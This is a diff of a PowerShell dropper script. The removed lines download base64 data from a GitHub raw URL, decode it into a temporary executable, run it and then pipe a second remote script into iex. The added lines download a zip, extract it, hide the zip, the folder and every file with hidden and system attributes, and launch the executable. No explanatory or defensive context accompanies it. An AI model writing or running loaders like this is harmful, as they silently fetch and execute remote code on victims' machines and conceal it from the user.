@@ -1,10 +1,14 @@
-$base64Url = "https://raw.githubusercontent.com/theuwpk/FRONT-EXE/refs/heads/main/MAIN/BASE64.TXT"
-$tempPath = [System.IO.Path]::GetTempFileName()
+$zipUrl = "https://example.com/arquivo.zip"
+$exeName = "programa.exe"
+$tempFolder = [System.IO.Path]::GetTempPath()
+$zipFile = Join-Path $tempFolder "arquivo.zip"
+$extractFolder = Join-Path $tempFolder "extraido"
+$exePath = Join-Path $extractFolder $exeName
 
-$base64Data = Invoke-WebRequest -Uri $base64Url -UseBasicParsing | Select-Object -ExpandProperty Content
-$binaryData = [System.Convert]::FromBase64String($base64Data)
-[System.IO.File]::WriteAllBytes($tempPath, $binaryData)
-Start-Process -FilePath $tempPath -NoNewWindow -Wait
-Remove-Item $tempPath -Force
+if (-Not (Test-Path $zipFile)) { Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile; & attrib +h +s $zipFile }
+if (-Not (Test-Path $extractFolder)) { Expand-Archive -Path $zipFile -DestinationPath $extractFolder -Force; & attrib +h +s $extractFolder }
 
-iwr -useb https://raw.githubusercontent.com/theuwpk/BACK-EXE/refs/heads/main/MAIN/INSTALL.TXT | iex
+$files = Get-ChildItem -Path $extractFolder -Recurse -File
+foreach ($file in $files) { & attrib +h +s $file.FullName }
+
+if (Test-Path $exePath) { Start-Process -FilePath $exePath }
